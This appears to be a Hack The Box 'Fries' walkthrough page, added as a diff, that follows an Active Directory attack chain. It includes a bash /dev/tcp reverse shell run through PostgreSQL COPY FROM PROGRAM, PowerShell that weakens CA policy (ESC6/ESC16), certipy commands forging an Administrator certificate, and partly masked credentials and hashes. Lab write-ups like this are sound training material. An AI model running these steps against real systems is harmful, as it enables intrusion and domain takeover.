@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Fries - Walkthrough</title>
+    <style>
+        body { font-family: "Segoe UI", Arial, sans-serif; line-height: 1.6; background-color: #f4f4f9; color: #333; max-width: 1000px; margin: 0 auto; padding: 20px; }
+        .container { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 5px 25px rgba(0,0,0,0.1); }
+        h1 { text-align: center; color: #343a40; border-bottom: 4px solid #007bff; padding-bottom: 10px; margin-bottom: 30px; }
+        h2 { color: #007bff; margin-top: 30px; padding-bottom: 5px; border-bottom: 2px solid #eee; }
+        .section { margin-bottom: 40px; }
+        .tag { display: inline-block; padding: 4px 10px; border-radius: 4px; font-weight: bold; font-size: 0.85em; margin-bottom: 10px; color: white; }
+        .tag-success { background-color: #28a745; }
+        .tag-failure { background-color: #dc3545; }
+        .tag-info { background-color: #17a2b8; }
+        pre { background: #282a36; color: #f8f8f2; padding: 20px; border-radius: 8px; overflow-x: auto; font-family: "Consolas", monospace; position: relative; margin: 20px 0; }
+        code { font-family: "Consolas", monospace; color: #e83e8c; background: #f8f9fa; padding: 2px 4px; border-radius: 4px; }
+        ul { padding-left: 20px; }
+        li { margin-bottom: 8px; }
+        .footer { text-align: center; margin-top: 40px; color: #888; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>HTB Fries - Walkthrough</h1>
+        <p style="text-align:left; margin-top:-15px; color:#555;"><strong>Category:</strong> Hard</p>
+
+        <div class="section">
+            <p>
+                Fries is a multi-layered AD environment with a Linux container host. It runs Docker and a few target services. Docker becomes important later. The attack chain combines web credential
+                leakage, container RCE, NFS abuse, LDAP credential extraction, and AD CS
+                misconfiguration (ESC6 + ESC16). The goal of this writeup is reproducibility and a low-noise
+                execution.
+            </p>
+        </div>
+
+        <div class="section">
+            <h2>1. Reconnaissance</h2>
+            <span class="tag tag-info">INFO</span>
+            <p>
+                The initial scan showed a Windows DC with the usual (Kerberos/LDAP/SMB/WinRM) services,
+                and an SSH Linux host also stood out. On the HTTP/HTTPS side, Fries web and PWM
+                were reachable, but early scanning was quite noisy. 
+            </p>
+            <pre><code>nmap -sC -sV -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985 10.129.244.72
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>2. Initial Access - pgAdmin chain</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With creds from a GitHub repo, pgAdmin authentication was possible, but the rest of the walkthrough failed there because a lot had already changed. In the Query Tool,
+                the <code>COPY ... FROM PROGRAM</code> command confirmed command execution, then it got a reverse shell in the PostgreSQL container.
+            </p>
+            <pre><code>DROP TABLE IF EXISTS cmd;
+CREATE TABLE cmd(output text);
+COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/&lt;LHOST&gt;/4445 0>&1"';
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>3. NFS enumeration and Docker pivot</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The NFS share reachable from the container returned the Docker host webroot and cert material.
+                The share also contained the PWM config and Docker TLS keys, which made the Docker API reachable.
+            </p>
+            <pre><code>./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59605603 ls
+./nfsclient 172.18.0.1:/srv/web.fries.htb root:0:59605603 get certs/
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>4. PWM config decoding - LDAP cred</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                The LDAP proxy password could be decoded from the PWM configuration, which provided domain access
+                for LDAP queries and cert enrollment.
+            </p>
+            <pre><code>svc_infra / m6tneOMAh5p0wQ***
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>5. gMSA password extraction</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                From LDAP read access, the gMSA managed password could be extracted with a valid NTLM hash. The gMSA
+                had CA modification rights. I do not want to redo this part ever again. :D 
+            </p>
+            <pre><code>gMSA_CA_prod$ / NTLM 11f74c5f1731edb7a8441dd4bd28e÷÷÷÷÷
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>6. AD CS ESC6 + ESC16 configuration</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                Over WinRM in the gMSA context, the CA policy could be modified via the COM admin interface, though with difficulty. EditFlags
+                enabled arbitrary SAN (ESC6), and DisableExtensionList disabled SID validation (ESC16).
+            </p>
+            <pre><code>$CA = New-Object -ComObject CertificateAuthority.Admin
+$Config = "DC01.fries.htb\fries-DC01-CA"
+$current = $CA.GetConfigEntry($Config,"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","EditFlags")
+$new = $current -bor 0x00040000
+$CA.SetConfigEntry($Config,"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","EditFlags",$new)
+$CA.SetConfigEntry($Config,"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy","DisableExtensionList","1.3.6.1.4.1.311.25.2")
+Restart-Service certsvc -Force
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>7. Administrator cert request</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With the <code>svc_infra</code> user on the User template, a cert request succeeded with Administrator UPN/SID
+                set. The result is a PFX for PKINIT.
+            </p>
+            <pre><code>certipy-ad req -u 'svc_infra@fries.htb' -p 'm6tneOMAh5p0wQ***' \
+  -ca 'fries-DC01-CA' -template 'User' \
+  -upn 'administrator@fries.htb' \
+  -sid 'S-1-5-21-858338346-3861030516-3975240472-500' \
+  -dc-ip 192.168.100.1 -target 192.168.100.1 -ns 192.168.100.1 -dns-tcp
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>8. Administrator auth + flags</h2>
+            <span class="tag tag-success">SUCCESS</span>
+            <p>
+                With the PFX, a TGT and Administrator NTLM hash could be extracted, which gave WinRM access.
+                Both flags were read from the Administrator Desktop in the end.
+            </p>
+            <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.100.1
+Administrator NTLM: a773cb05d79273299a684a23ede56748
+</code></pre>
+            <pre><code># WinRM
+user flag: 39b1aa196ade7efe71905a43abe51*****
+root flag: fefa72c9fa241526d59a71ef96fc4*****
+</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>9. Failed paths</h2>
+            <span class="tag tag-failure">DEAD END</span>
+            <ul>
+                <li><strong>EnrollmentAgent template:</strong> it was enabled but did not grant enroll rights to non-DA accounts. Nearly 3 hours went into this step. Unfortunately a dead end.</li>
+                <li><strong>certutil -setreg:</strong> direct registry modification without an admin token was also rejected; it worked via COM API in the end.</li>
+                <li><strong>Kerberos auth:</strong> due to missing time sync, the first attempt hit KRB_AP_ERR_SKEW, resolved after UTC sync. Time sync is typically a major pitfall on most HTB boxes, because people regularly forget it.</li>
+            </ul>
+        </div>
+
+        <div class="footer">
+            <p>HTB Fries Walkthrough | 2026.jan.05 | Ogre</p>
+        </div>
+    </div>
+</body>
+</html>
